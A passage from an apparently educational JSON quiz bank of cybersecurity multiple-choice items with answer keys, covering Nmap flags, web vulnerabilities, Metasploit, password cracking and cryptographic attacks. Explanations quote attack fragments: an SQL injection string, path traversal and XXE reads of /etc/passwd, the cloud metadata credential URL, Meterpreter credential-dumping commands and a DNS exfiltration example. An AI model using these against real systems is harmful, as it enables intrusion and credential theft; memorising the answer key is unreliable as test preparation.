      "White Box Testing (Full-Knowledge Testing)",
      "Grey Box Testing (Partial-Knowledge Testing)",
      "Crystal Box Testing",
      "Black Box Testing (Zero-Knowledge Testing)"
    ],
    "answer": 3,
    "explanation": "In Black Box testing, the tester simulates an external adversary with zero inside knowledge of infrastructure, source code, or internal accounts, relying solely on open reconnaissance."
  },
  {
    "id": 61,
    "question": "What penetration testing engagement model provides the tester with complete access to source code, architectural documentation, configurations, and administrative accounts?",
    "options": [
      "White Box Testing",
      "Black Box Testing",
      "Grey Box Testing",
      "Blind Testing"
    ],
    "answer": 0,
    "explanation": "White Box testing provides full transparency: the tester has access to source code, network diagrams, system configurations, and credentials, enabling thorough internal auditing and code review. (Clear-Box / Crystal-Box Testing)"
  },
  {
    "id": 62,
    "question": "What penetration testing methodology framework standardizes the engagement lifecycle into 7 phases: Pre-engagement, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post Exploitation, and Reporting?",
    "options": [
      "NIST SP 800-88",
      "PTES (Penetration Testing Execution Standard)",
      "ISO/IEC 27037",
      "RFC 3227"
    ],
    "answer": 1,
    "explanation": "PTES (Penetration Testing Execution Standard) defines the standard 7-phase methodology: Pre-engagement Interactions, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post Exploitation, and Reporting."
  },
  {
    "id": 63,
    "question": "In Nmap port scanning, what flag executes a 'TCP SYN Stealth Scan' (half-open scan)?",
    "options": [
      "-sT (TCP Connect Scan)",
      "-sU (UDP Scan)",
      "-sS",
      "-sA (TCP ACK Scan)"
    ],
    "answer": 2,
    "explanation": "Nmap's '-sS' sends TCP SYN packets. If SYN-ACK returns, the port is open; Nmap immediately sends RST to tear down the connection without completing the 3-way handshake, minimizing logging on older systems."
  },
  {
    "id": 64,
    "question": "In Nmap, what flag executes a full 'TCP Connect Scan' utilizing the operating system's native network socket API?",
    "options": [
      "-sS",
      "-sN (TCP Null Scan)",
      "-sX (TCP Xmas Scan)",
      "-sT"
    ],
    "answer": 3,
    "explanation": "'-sT' completes the full TCP 3-way handshake (SYN, SYN-ACK, ACK) using the OS 'connect()' system call. It is used when raw packet privileges are unavailable, but is heavily logged by target firewalls."
  },
  {
    "id": 65,
    "question": "What Nmap flag instructs the scanner to determine application and service version information running on open ports?",
    "options": [
      "-sV",
      "-sC (Default Scripts)",
      "-O (OS Detection)",
      "-Pn (Treat all hosts as online)"
    ],
    "answer": 0,
    "explanation": "The '-sV' flag enables version detection, querying open ports with probes to identify application names (e.g. Apache, OpenSSH, Microsoft IIS) and exact version numbers to map against CVE databases."
  },
  {
    "id": 66,
    "question": "What Nmap flag instructs the scanner to execute standard vulnerability and enumeration scripts from the Nmap Scripting Engine (NSE)?",
    "options": [
      "-sU",
      "-sC (or --script=default)",
      "-sn (Ping scan)",
      "-p- (All ports)"
    ],
    "answer": 1,
    "explanation": "'-sC' runs default Nmap Scripting Engine (NSE) scripts that perform safe banner grabbing, SSL certificate inspection, authentication checks, and common vulnerability identification."
  },
  {
    "id": 67,
    "question": "What Nmap command-line flag disables ICMP ping host discovery, forcing Nmap to scan the target ports even if the host does not respond to ping?",
    "options": [
      "-sn (Disable port scan)",
      "-n (Never do DNS resolution)",
      "-Pn",
      "-F (Fast scan 100 ports)"
    ],
    "answer": 2,
    "explanation": "Firewalls often drop ICMP Echo requests. By default, Nmap skips hosts that do not reply to ping; adding '-Pn' forces Nmap to proceed directly to port scanning without ping discovery. (Treat all hosts as online / skip host discovery)"
  },
  {
    "id": 68,
    "question": "In Nmap, what does a port status of 'Filtered' signify to a penetration tester?",
    "options": [
      "An application is actively listening on the port and accepting TCP connections",
      "The target host has replied with a TCP RST packet indicating the port is closed",
      "The target operating system has crashed due to a kernel buffer overflow exception",
      "A firewall, packet filter, or router ACL is dropping probes, preventing Nmap from determining if the port is open or closed"
    ],
    "answer": 3,
    "explanation": "A 'Filtered' status means Nmap received no response (probe dropped) or an ICMP unreachable error (type 3 code 1, 2, 3, 9, 10, 13), indicating an active firewall or network packet filter."
  },
  {
    "id": 69,
    "question": "What widely used open-source web application security project publishes a periodic consensus list of the ten most critical web application security risks?",
    "options": [
      "OWASP (Open Worldwide Application Security Project)",
      "MITRE Corporation",
      "NIST (National Institute of Standards and Technology)",
      "SANS Institute"
    ],
    "answer": 0,
    "explanation": "OWASP (Open Worldwide Application Security Project) is a non-profit foundation providing web security guidance, tools (ZAP), and the globally referenced 'OWASP Top 10' security vulnerability report."
  },
  {
    "id": 70,
    "question": "In web application security, what vulnerability occurs when untrusted user input is concatenated directly into a database query string?",
    "options": [
      "Cross-Site Scripting (XSS - CWE-79)",
      "SQL Injection (SQLi - CWE-89)",
      "Cross-Site Request Forgery (CSRF - CWE-352)",
      "Server-Side Request Forgery (SSRF - CWE-918)"
    ],
    "answer": 1,
    "explanation": "SQL Injection occurs when user input containing SQL metacharacters (e.g. `' OR 1=1 --`) is concatenated into SQL queries, altering query logic and allowing unauthorized database extraction, modification, or code execution."
  },
  {
    "id": 71,
    "question": "What is the primary architectural defense against SQL Injection vulnerabilities in software development?",
    "options": [
      "Client-side JavaScript input length validation",
      "Converting all database user passwords to uppercase ASCII text",
      "Parameterized Queries (Prepared Statements) with parameterized inputs",
      "Encrypting web traffic using 128-bit Transport Layer Security certificates"
    ],
    "answer": 2,
    "explanation": "Parameterized queries (Prepared Statements) separate SQL code from user data. The database compiles the query structure first; user inputs are treated strictly as parameters, preventing metacharacters from altering logic."
  },
  {
    "id": 72,
    "question": "What vulnerability occurs when an application embeds unvalidated user input into a rendered web page, causing the victim's browser to execute malicious JavaScript?",
    "options": [
      "SQL Injection",
      "Insecure Deserialization",
      "Directory Traversal",
      "Cross-Site Scripting (XSS)"
    ],
    "answer": 3,
    "explanation": "Cross-Site Scripting (XSS) allows attackers to inject malicious client-side scripts into web pages viewed by other users, enabling session cookie theft, keystroke logging, and page defacement."
  },
  {
    "id": 73,
    "question": "What type of XSS occurs when a malicious script is permanently stored in the application's database (e.g. in a comment forum) and served to every visiting user?",
    "options": [
      "Stored XSS (Persistent XSS)",
      "Reflected XSS (Non-Persistent XSS)",
      "DOM-based XSS",
      "Blind SQL Injection"
    ],
    "answer": 0,
    "explanation": "Stored (Persistent) XSS stores the malicious payload permanently in the database, file system, or message board. Whenever victims view the stored record, the malicious script executes in their browser."
  },
  {
    "id": 74,
    "question": "What type of XSS occurs when an attacker crafts a malicious URL containing JavaScript that the server reflects back in the immediate HTTP response without sanitization?",
    "options": [
      "Stored XSS",
      "Reflected XSS (Non-Persistent XSS)",
      "Blind XSS",
      "Second-Order SQL Injection"
    ],
    "answer": 1,
    "explanation": "Reflected XSS reflects the payload off the web server directly in the HTTP response (e.g., search error message). It requires tricking the victim into clicking a crafted phishing link."
  },
  {
    "id": 75,
    "question": "What web browser cookie attribute prevents client-side JavaScript (e.g. via document.cookie in an XSS attack) from accessing the session cookie?",
    "options": [
      "Secure",
      "SameSite=Strict",
      "HttpOnly",
      "Domain"
    ],
    "answer": 2,
    "explanation": "The 'HttpOnly' flag instructs the browser that the cookie must not be accessible via client-side scripts (like document.cookie). Even if an attacker executes XSS, they cannot steal the HttpOnly session cookie."
  },
  {
    "id": 76,
    "question": "What web browser cookie attribute ensures that cookies are transmitted exclusively over encrypted HTTPS connections, preventing cleartext sniffing?",
    "options": [
      "HttpOnly",
      "SameSite=Lax",
      "Path=/",
      "Secure"
    ],
    "answer": 3,
    "explanation": "The 'Secure' attribute tells the browser to send the cookie only over encrypted (HTTPS) requests, preventing cookie theft via unencrypted HTTP transmissions."
  },
  {
    "id": 77,
    "question": "What vulnerability allows an attacker to induce an authenticated user's browser into transmitting unauthorized state-changing requests to a web application without their knowledge?",
    "options": [
      "Cross-Site Request Forgery (CSRF - CWE-352)",
      "Cross-Site Scripting (XSS)",
      "SQL Injection",
      "Server-Side Request Forgery (SSRF)"
    ],
    "answer": 0,
    "explanation": "CSRF tricks an authenticated victim's browser into executing unwanted actions (e.g., transferring funds, changing email) on a trusted web application by embedding unauthorized requests in malicious sites."
  },
  {
    "id": 78,
    "question": "What primary defense mechanism prevents Cross-Site Request Forgery (CSRF) attacks across web applications?",
    "options": [
      "Converting all database user passwords to 256-bit SHA-2 hashes",
      "Anti-CSRF Tokens (unique, unpredictable, secret tokens validated on state-changing requests) and SameSite cookie attributes",
      "Restricting web server network bandwidth using stateful packet inspection firewalls",
      "Executing virus scans on all uploaded multimedia attachments"
    ],
    "answer": 1,
    "explanation": "Anti-CSRF tokens (synchronizer tokens) are cryptographically random values tied to the user session. The server validates the token on POST requests; since third-party malicious sites cannot read the token, the forged request fails."
  },
  {
    "id": 79,
    "question": "What vulnerability allows an attacker to manipulate file paths using directory traversal sequences ('../') to access arbitrary files on the web server file system?",
    "options": [
      "SQL Injection",
      "Cross-Site Scripting",
      "Path Traversal",
      "Insecure Cryptographic Storage"
    ],
    "answer": 2,
    "explanation": "Path Traversal abuses unvalidated path inputs using dot-dot-slash ('../../etc/passwd') sequences to escape the web root folder and read sensitive system files (e.g. /etc/passwd or C:\\Windows\\win.ini). (Directory Traversal / Dot-Dot-Slash Attack - CWE-22)"
  },
  {
    "id": 80,
    "question": "What web vulnerability occurs when an application parses XML input containing references to external XML entities, allowing file retrieval and SSRF?",
    "options": [
      "SQL Injection",
      "Cross-Site Scripting",
      "Buffer Overflow",
      "XML External Entity (XXE) Injection (CWE-611)"
    ],
    "answer": 3,
    "explanation": "XXE occurs when XML parsers process user-controlled XML documents containing external entity declarations (`<!ENTITY xxe SYSTEM \"file:///etc/passwd\">`), leading to local file disclosure and internal network port scanning."
  },
  {
    "id": 81,
    "question": "What web vulnerability occurs when an attacker tricks a back-end web server into making HTTP requests to arbitrary internal or external network resources?",
    "options": [
      "Server-Side Request Forgery (SSRF - CWE-918)",
      "Cross-Site Request Forgery (CSRF)",
      "Cross-Site Scripting (XSS)",
      "Insecure Direct Object Reference (IDOR)"
    ],
    "answer": 0,
    "explanation": "In SSRF, the attacker forces the vulnerable server to make HTTP requests to internal IP addresses (e.g. 127.0.0.1 or cloud metadata service 169.254.169.254), accessing internal systems protected by firewalls."
  },
  {
    "id": 82,
    "question": "In cloud environments (e.g. AWS, Azure, GCP), what specific IP address is targeted by SSRF attacks to extract temporary instance IAM role credentials?",
    "options": [
      "192.168.1.1",
      "169.254.169.254 (Instance Metadata Service / IMDS)",
      "127.0.0.1",
      "10.0.0.1"
    ],
    "answer": 1,
    "explanation": "The link-local address '169.254.169.254' hosts the cloud Instance Metadata Service (IMDS). In AWS EC2, querying 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' returns IAM security tokens."
  },
  {
    "id": 83,
    "question": "What access control vulnerability occurs when an application exposes a direct reference to an internal database object (e.g. user_id=105) without authorization validation?",
    "options": [
      "SQL Injection",
      "Cross-Site Scripting",
      "Insecure Direct Object Reference",
      "Cross-Site Request Forgery"
    ],
    "answer": 2,
    "explanation": "IDOR occurs when a web application uses user-supplied input to access an object directly (e.g. 'view_receipt.php?invoice_id=1004') without checking whether the authenticated user has permission to access that specific record. (IDOR - Broken Object Level Authorization)"
  },
  {
    "id": 84,
    "question": "What intercepting proxy tool developed by PortSwigger is the global de facto standard for testing and analyzing web application security?",
    "options": [
      "Wireshark",
      "John the Ripper",
      "Autopsy",
      "Burp Suite"
    ],
    "answer": 3,
    "explanation": "Burp Suite (Community / Professional) is the industry-standard web penetration testing platform, providing an intercepting HTTP proxy, Repeater (manual request editing), Intruder (fuzzing), and active web vulnerability scanning."
  },
  {
    "id": 85,
    "question": "In Burp Suite, what core component allows a penetration tester to manually modify, re-send, and analyze individual HTTP requests and responses?",
    "options": [
      "Repeater",
      "Intruder",
      "Sequencer",
      "Decoder"
    ],
    "answer": 0,
    "explanation": "Burp Repeater allows testers to capture an HTTP request, modify headers, parameters, or payloads by hand, and send it repeatedly to analyze server responses, testing for injection and access control flaws."
  },
  {
    "id": 86,
    "question": "In Burp Suite, what core component automates customized, high-speed parameter fuzzing and credential dictionary attacks against web forms?",
    "options": [
      "Repeater",
      "Intruder",
      "Comparer",
      "Proxy"
    ],
    "answer": 1,
    "explanation": "Burp Intruder automates attacks by placing payload markers across HTTP parameters, iterating through wordlists to perform parameter fuzzing, directory brute-forcing, and credential credential stuffing."
  },
  {
    "id": 87,
    "question": "What leading open-source exploitation framework developed by Rapid7 standardizes exploits, payloads, encoders, and post-exploitation modules?",
    "options": [
      "Nessus Professional",
      "OpenVAS Scanner",
      "Metasploit Framework",
      "Wireshark Analyzer"
    ],
    "answer": 2,
    "explanation": "The Metasploit Framework (MSF) is the premier open-source penetration testing and exploitation platform, hosting thousands of modular exploits, payloads, auxiliary scanners, and post-exploitation scripts."
  },
  {
    "id": 88,
    "question": "In the Metasploit Framework, what is the architectural difference between a 'Staged Payload' and a 'Singles (Inline) Payload'?",
    "options": [
      "Staged payloads operate exclusively over cellular modems; singles operate over Wi-Fi",
      "Staged payloads require physical hardware dongle access; singles run in cloud containers",
      "Staged payloads are written in Python; singles are written in JavaScript",
      "Staged payloads inject a tiny stub (stager) that connects back and downloads a larger payload (stage) into memory; singles contain the entire self-contained payload in one binary"
    ],
    "answer": 3,
    "explanation": "Staged payloads (e.g. 'windows/x64/meterpreter/reverse_tcp') use a small stager to fit in restricted buffer spaces, which pulls the full stage (Meterpreter) into RAM. Singles ('windows/x64/meterpreter_reverse_tcp') are monolithic."
  },
  {
    "id": 89,
    "question": "What is 'Meterpreter' in the Metasploit Framework?",
    "options": [
      "An advanced, in-memory, dynamically extensible payload that executes entirely via reflective DLL injection without writing to disk",
      "An automated commercial software licensing verification service",
      "A hardware tool used to calibrate Ethernet transmission cable resistance",
      "A cloud firewall that blocks distributed denial of service attacks"
    ],
    "answer": 0,
    "explanation": "Meterpreter is Metasploit's premier post-exploitation payload. It resides completely in volatile RAM (via reflective DLL injection), executes invisibly in the host process, and provides interactive shell, pivoting, and credential dumping."
  },
  {
    "id": 90,
    "question": "In Metasploit, what payload naming convention designates a 'staged' payload versus a 'non-staged (single)' payload?",
    "options": [
      "Staged payloads begin with capital letters; non-staged begin with numbers",
      "Staged payloads use a slash separator between protocol components (e.g. meterpreter/reverse_tcp); non-staged payloads use an underscore (e.g. meterpreter_reverse_tcp)",
      "Staged payloads use the suffix '.exe'; non-staged use '.bin'",
      "Staged payloads require a 128-bit MD5 checksum parameter"
    ],
    "answer": 1,
    "explanation": "In Metasploit naming: 'windows/meterpreter/reverse_tcp' (with a slash) is STAGED (stager + stage); 'windows/meterpreter_reverse_tcp' (with an underscore) is SINGLE (inline monolithic payload)."
  },
  {
    "id": 91,
    "question": "What command is executed in a Metasploit Meterpreter session to dump local NTLM password hashes from the Windows SAM hive?",
    "options": [
      "getsystem",
      "sysinfo",
      "hashdump",
      "migrate"
    ],
    "answer": 2,
    "explanation": "In Meterpreter, 'hashdump' extracts local user accounts and their NTLM password hashes from the Security Account Manager (SAM) hive, enabling offline cracking with John the Ripper or Hashcat."
  },
  {
    "id": 92,
    "question": "What command in a Metasploit Meterpreter session attempts to automatically escalate privileges to 'NT AUTHORITY\\SYSTEM' using multiple kernel techniques?",
    "options": [
      "hashdump",
      "privcheck",
      "escalate",
      "getsystem"
    ],
    "answer": 3,
    "explanation": "'getsystem' automates privilege escalation from an administrative prompt to SYSTEM by attempting multiple techniques: Named Pipe Impersonation (Technique 1 & 2) and Token Duplication (Technique 3)."
  },
  {
    "id": 93,
    "question": "What command in a Metasploit Meterpreter session moves the payload from its current process into a different legitimate host process (e.g. explorer.exe)?",
    "options": [
      "migrate <PID>",
      "inject <PID>",
      "switch <PID>",
      "pivot <PID>"
    ],
    "answer": 0,
    "explanation": "'migrate <PID>' injects the Meterpreter payload into a different running process (e.g. explorer.exe or svchost.exe) using reflective DLL injection and terminates the original ephemeral process, establishing stealth persistence."
  },
  {
    "id": 94,
    "question": "What is 'Pivoting' (Network Pivoting) in penetration testing post-exploitation?",
    "options": [
      "Rotating the orientation of an external directional Wi-Fi antenna 180 degrees",
      "Using a compromised target machine as a gateway/tunnel to route attack traffic into deeper, non-routable internal network segments",
      "Switching symmetric encryption modes from ECB to CBC during database backups",
      "Translating compiled x86 machine instructions into ARM assembly instructions"
    ],
    "answer": 1,
    "explanation": "Pivoting routes traffic through a compromised foothold machine (via SSH tunneling, SOCKS proxy, or Metasploit 'route add' / 'autoroute') to attack isolated internal subnets that cannot be reached directly from the internet."
  },
  {
    "id": 95,
    "question": "What command-line tool included in Metasploit generates custom standalone exploit binaries, shellcode, and payloads across Windows, Linux, and Android?",
    "options": [
      "msfconsole",
      "msfdb",
      "msfvenom",
      "msfupdate"
    ],
    "answer": 2,
    "explanation": "msfvenom (combining legacy msfpayload and msfencode) is Metasploit's standalone payload generator and encoder. It outputs raw shellcode, EXEs, ELF binaries, APKs, and ASPX web shells with custom formatting."
  },
  {
    "id": 96,
    "question": "What password-cracking tool written by Solar Designer is renowned for offline dictionary, rule-based, and brute-force cracking of Unix/Windows password hashes?",
    "options": [
      "Hydra",
      "Nmap",
      "Burp Suite",
      "John the Ripper"
    ],
    "answer": 3,
    "explanation": "John the Ripper (JtR) is a premier open-source offline password cracker supporting hundreds of hash formats (DES, MD5, SHA-512 crypt, NTLM, Kerberos), featuring powerful wordlist mangling rules."
  },
  {
    "id": 97,
    "question": "What password-cracking utility is recognized as the world's fastest GPU-accelerated hash cracker, utilizing OpenCL and CUDA?",
    "options": [
      "Hashcat",
      "Hydra",
      "Medusa",
      "Ophcrack"
    ],
    "answer": 0,
    "explanation": "Hashcat is the leading GPU-accelerated offline password cracking tool. By leveraging graphics processor compute cores, it evaluates billions of NTLM and MD5 hashes per second using mask, dictionary, and hybrid attacks."
  },
  {
    "id": 98,
    "question": "What fast online network login cracking tool supports brute-forcing credentials across protocols like SSH, FTP, RDP, Telnet, and HTTP-POST?",
    "options": [
      "Hashcat",
      "THC-Hydra",
      "John the Ripper",
      "Volatility"
    ],
    "answer": 1,
    "explanation": "THC-Hydra is a multi-threaded online network authentication brute-forcing tool supporting over 50 protocols (SSH, FTP, HTTP, SMB, RDP, MySQL), used to test authentication strength against password guessing."
  },
  {
    "id": 99,
    "question": "In penetration testing reporting, what constitutes the 'Executive Summary' section?",
    "options": [
      "A raw hexadecimal dump of all captured network packet captures",
      "The step-by-step terminal command lines executed during exploitation",
      "A high-level overview written in business-oriented, non-technical language summarizing strategic risks, overall security posture, and critical business impacts for leadership",
      "The physical serial numbers of all laboratory testing equipment"
    ],
    "answer": 2,
    "explanation": "The Executive Summary provides C-level executives with a concise, non-technical synthesis of engagement findings: overall risk rating, critical vulnerabilities found, potential business impact, and strategic remediation recommendations."
  },
  {
    "id": 100,
    "question": "What is the final, essential phase of a formal Penetration Testing engagement before submitting the report and closing the contract?",
    "options": [
      "Publicly disclosing all discovered zero-day exploits on social media",
      "Permanently encrypting the client's production database using custom ransomware",
      "Resetting the client's internal network gateway router back to factory defaults",
      "Remediation Verification (Re-testing) and Cleanup (removing all dropped backdoors, test accounts, and artifacts)"
    ],
    "answer": 3,
    "explanation": "Cleanup requires removing all tools, scripts, temporary user accounts, and testing artifacts from client systems. Re-testing verifies whether the client's engineering team successfully remediated the reported vulnerabilities."
  },
  {
    "id": 101,
    "question": "What mathematical attack factors an RSA modulus n if the two prime factors p and q are chosen too close to each other (p \u2248 q \u2248 \u221an)?",
    "options": [
      "Fermat's Factorization Method",
      "Wiener's Continued Fraction Attack",
      "Hastad's Broadcast Attack",
      "Coppersmith's Short Pad Attack"
    ],
    "answer": 0,
    "explanation": "Fermat's factorization algorithm expresses $n$ as the difference of two squares ($n = a^2 - b^2 = (a-b)(a+b)$). If $p$ and $q$ are close, $a$ is close to $\\sqrt{n}$, factoring $n$ in very few steps."
  },
  {
    "id": 102,
    "question": "What attack breaks an RSA private key if the private exponent d was chosen too small (d < 1/3 * n^(1/4)) to accelerate decryption?",
    "options": [
      "Fermat's Factorization Method",
      "Wiener's Continued Fraction Attack",
      "Bleichenbacher's Oracle Attack",
      "Pollard's p-1 Algorithm"
    ],
    "answer": 1,
    "explanation": "Michael J. Wiener proved that if private exponent $d < \frac{1}{3} n^{1/4}$, then $d$ appears as the denominator of one of the continued fraction convergents of $e/n$, completely breaking the private key."
  },
  {
    "id": 103,
    "question": "What attack exploits an RSA setup where the same message is encrypted with public exponent e=3 and sent to 3 distinct recipients with different moduli?",
    "options": [
      "Wiener's Continued Fraction Attack",
      "Meet-in-the-Middle Attack",
      "Hastad's Broadcast Attack",
      "Birthday Paradox Collision Attack"
    ],
    "answer": 2,
    "explanation": "Johan Hastad demonstrated that if the same message is sent to $e$ recipients sharing small exponent $e$ (e.g. $e=3$), the Chinese Remainder Theorem combines the 3 ciphertexts to yield $m^e$, taking the integer $e$-th root directly without factoring. (using the Chinese Remainder Theorem)"
  },
  {
    "id": 104,
    "question": "What quantum algorithm discovered by Peter Shor solves prime factorization and discrete logarithms in polynomial time, threatening RSA, DH, and ECC?",
    "options": [
      "Grover's Algorithm",
      "Deutsch-Jozsa Algorithm",
      "Simon's Algorithm",
      "Shor's Algorithm"
    ],
    "answer": 3,
    "explanation": "Shor's quantum algorithm finds the period of a function in polynomial time ($O((\\log N)^3)$). On a sufficiently large quantum computer, it will completely break all discrete-log and factoring-based asymmetric cryptosystems."
  },
  {
    "id": 105,
    "question": "What quantum search algorithm discovered by Lov Grover provides a quadratic speedup for searching unsorted databases, impacting symmetric ciphers?",
    "options": [
      "Grover's Algorithm",
      "Shor's Algorithm",
      "Bernstein-Vazirani Algorithm",
      "Quantum Fourier Transform"
    ],
    "answer": 0,
    "explanation": "Grover's algorithm searches an unsorted database of $N$ items in $O(\\sqrt{N})$ time. Applied to brute-force key search, it halves the effective key length (AES-128 offers 64-bit quantum security; AES-256 offers 128-bit quantum security). (halving the effective bit security of symmetric keys, e.g. AES-256 drops to 128-bit quantum security)"
  },
  {
    "id": 106,
    "question": "What mathematical family forms the primary basis for modern Post-Quantum Cryptography (PQC) standards selected by NIST (e.g. ML-KEM / CRYSTALS-Kyber)?",
    "options": [
      "Elliptic Curve Point Multiplication",
      "Lattice-Based Cryptography (Learning With Errors / Ring-LWE problem)",
      "Large Integer Prime Factorization",
      "Linear Feedback Shift Register Synthesis"
    ],
    "answer": 1,
    "explanation": "NIST's post-quantum standards (such as ML-KEM / CRYSTALS-Kyber and ML-DSA / CRYSTALS-Dilithium) rely on lattice problems (e.g. Learning With Errors - LWE), which are believed to be hard for both classical and quantum computers."
  },
  {
    "id": 107,
    "question": "What password-hashing algorithm won the international Password Hashing Competition (PHC) in 2015, featuring configurable memory, time, and parallelism costs?",
    "options": [
      "PBKDF2 (HMAC-SHA1)",
      "bcrypt",
      "Argon2 (specifically Argon2id)",
      "scrypt"
    ],
    "answer": 2,
    "explanation": "Argon2 was selected as the winner of the Password Hashing Competition (2015). Its hybrid variant, 'Argon2id', provides maximum resistance against both side-channel attacks and GPU-accelerated brute-force attacks."
  },
  {
    "id": 108,
    "question": "What property distinguishes 'scrypt' and 'Argon2' from legacy password hashing algorithms like PBKDF2?",
    "options": [
      "They utilize 1024-bit RSA private signing keys",
      "They eliminate the need for unique cryptographic salts",
      "They encrypt passwords using stream ciphers without hashing",
      "Memory-Hardness: requiring massive amounts of RAM to compute each hash, defeating cost-effective GPU/ASIC parallel brute-forcing"
    ],
    "answer": 3,
    "explanation": "PBKDF2 is compute-hard but requires negligible memory, allowing ASICs/GPUs to test millions of guesses in parallel. Scrypt and Argon2 are memory-hard: each hash calculation fills megabytes of RAM, crippling GPU parallelism."
  },
  {
    "id": 109,
    "question": "What security technique binds a mobile application or browser client strictly to a specific server public key or certificate to prevent proxy MitM interception?",
    "options": [
      "Certificate Pinning (Public Key Pinning)",
      "Certificate Revocation List Checking",
      "Domain Name System Anycast Routing",
      "HTTP Strict Transport Security"
    ],
    "answer": 0,
    "explanation": "Certificate Pinning embeds the server's expected public key or certificate hash inside the client application code. If a proxy (like Burp Suite) intercepts traffic with its own CA certificate, the app rejects the connection."
  },
  {
    "id": 110,
    "question": "What tool is standard for bypassing SSL/TLS certificate pinning in Android mobile applications by hooking cryptographic APIs at runtime?",
    "options": [
      "Wireshark",
      "Frida",
      "Nmap",
      "John the Ripper"
    ],
    "answer": 1,
    "explanation": "Frida is a dynamic instrumentation toolkit that allows penetration testers to inject JavaScript hooks into running native Android/iOS apps, hooking TrustManager and OpenSSL methods to disable certificate pinning on the fly. (using dynamic binary instrumentation scripts)"
  },
  {
    "id": 111,
    "question": "In covert communications, what network steganography technique hides data inside the TCP protocol header?",
    "options": [
      "Altering the Ethernet MAC address of the physical network interface",
      "Increasing the physical electrical resistance of the twisted pair cable",
      "Modifying the Initial Sequence Number (ISN) field, Urgent Pointer, or IP Identification field to encode secret payload bytes",
      "Setting the MTU packet size to 65,535 bytes across all subnets"
    ],
    "answer": 2,
    "explanation": "Network steganography embeds covert channels within unused or pseudorandom header fields (e.g., embedding data in the 32-bit TCP Initial Sequence Number, IP ID, or manipulating timestamp options) without disrupting transmission."
  },
  {
    "id": 112,
    "question": "What data exfiltration technique encodes sensitive internal data into subdomains of DNS query packets to bypass perimeter network firewalls?",
    "options": [
      "BGP Route Poisoning",
      "ICMP Redirect Exploitation",
      "ARP Cache Poisoning",
      "DNS Tunneling (e.g. dnscat2, iodine)"
    ],
    "answer": 3,
    "explanation": "Because corporate firewalls allow outbound DNS queries (UDP port 53) to resolve internet domains, attackers encode stolen data into DNS query labels (e.g. 'stolen_data.attacker.com'). An authoritative nameserver reassembles the data."
  },
  {
    "id": 113,
    "question": "What open-source steganography analysis tool is renowned for analyzing spatial domain images, evaluating bit-planes, and extracting LSB payloads from PNG/BMP files?",
    "options": [
      "Stegsolve / zsteg",
      "Nmap NSE",
      "Volatility Framework",
      "Burp Suite Professional"
    ],
    "answer": 0,
    "explanation": "Stegsolve (Java GUI) and zsteg (Ruby CLI) analyze image color planes, alpha channels, and bit-level representations, instantly extracting LSB payloads, text, and hidden zip archives from PNG/BMP images."
  },
  {
    "id": 114,
    "question": "In penetration testing intelligence gathering, what is the distinction between 'Passive Reconnaissance' and 'Active Reconnaissance'?",
    "options": [
      "Passive reconnaissance requires commercial tool licenses; active reconnaissance is public domain",
      "Passive reconnaissance gathers intelligence without interacting with or sending traffic to the target systems; active reconnaissance sends packets directly to probe target assets",
      "Passive reconnaissance operates exclusively over satellite radio; active reconnaissance runs on fiber",
      "Passive reconnaissance exploits buffer overflows; active reconnaissance dumps user passwords"
    ],
    "answer": 1,
    "explanation": "Passive reconnaissance (WHOIS, DNS records, search engine dorking, Shodan, LinkedIn) leaves zero traces on target logs. Active reconnaissance (port scanning, web crawling, banner grabbing) connects directly to target servers."
  },
  {
    "id": 115,
    "question": "What search engine indexes Internet-connected devices, industrial control systems (ICS), webcams, and open ports by scanning the entire public IPv4 address space?",
    "options": [
      "Google Search Engine",
      "DuckDuckGo",
      "Shodan (and Censys)",
      "Wayback Machine"
    ],
    "answer": 2,
    "explanation": "Shodan crawls the internet 24/7, grabbing service banners on open ports across the entire IPv4 space, allowing penetration testers to discover exposed routers, industrial SCADA systems, databases, and unpatched servers passively."
  },
  {
    "id": 116,
    "question": "What DNS query type attempts to download the complete zone file (all registered hostnames and IP addresses) from an authoritative DNS server?",
    "options": [
      "DNS Reverse Lookup (PTR)",
      "DNS Mail Exchange Query (MX)",
      "DNS Canonical Name Query (CNAME)",
      "DNS Zone Transfer (AXFR - type=AXFR)"
    ],
    "answer": 3,
    "explanation": "A DNS Zone Transfer (AXFR over TCP port 53) replicates the complete DNS database between primary and secondary nameservers. If misconfigured to allow public transfers, testers obtain the complete network topology in one query."
  },
  {
    "id": 117,
    "question": "In Nmap port scanning, what scan type sets the FIN, PSH, and URG flags simultaneously, illuminating the TCP packet 'like a Christmas tree'?",
    "options": [
      "-sX (TCP Xmas Scan)",
      "-sN (TCP Null Scan)",
      "-sF (TCP FIN Scan)",
      "-sM (TCP Maimon Scan)"
    ],
    "answer": 0,
    "explanation": "An Xmas scan ('-sX') sets FIN, PSH, and URG flags. According to RFC 793, closed ports should reply with RST, while open/filtered ports drop the packet without replying on compliant Unix/BSD network stacks."
  },
  {
    "id": 118,
    "question": "In Nmap, what scan type sends a TCP packet with absolutely zero control flags set (all flag bits = 0)?",
    "options": [
      "-sF (TCP FIN Scan)",
      "-sN (TCP Null Scan)",
      "-sX (TCP Xmas Scan)",
      "-sA (TCP ACK Scan)"
    ],
    "answer": 1,
    "explanation": "A Null scan ('-sN') turns off all control flags. In RFC 793 compliant systems, a closed port responds with RST, while an open port silently discards the frame, allowing stealth port discovery without triggering SYN alerts."
  },
  {
    "id": 119,
    "question": "What extremely stealthy Nmap port scan technique uses a blind third-party 'zombie' host to probe targets by monitoring predictable IP ID sequence increments?",
    "options": [
      "-sS (TCP SYN Scan)",
      "-sT (TCP Connect Scan)",
      "-sI (TCP Idle Scan)",
      "-sW (TCP Window Scan)"
    ],
    "answer": 2,
    "explanation": "The Idle scan ('-sI <zombie_host>') allows completely blind port scanning: the attacker sends zero packets from their own IP address to the target, instead observing IP ID changes on an idle zombie host to determine port state."
  },
  {
    "id": 120,
    "question": "What Layer 2 network attack transmits forged Address Resolution Protocol messages across a local subnet to map an attacker's MAC address to the default gateway IP?",
    "options": [
      "DNS Spoofing",
      "DHCP Starvation",
      "BGP Hijacking",
      "ARP Spoofing / ARP Cache Poisoning"
    ],
    "answer": 3,
    "explanation": "ARP poisoning sends gratuitous ARP replies associating the gateway's IP with the attacker's MAC. Traffic destined for the gateway routes through the attacker, enabling local Man-in-the-Middle (MitM) packet inspection."
  },
  {
    "id": 121,
    "question": "What Layer 2 network attack floods a network switch's Content Addressable Memory (CAM) table with randomized MAC addresses, forcing the switch to act like a hub?",
    "options": [
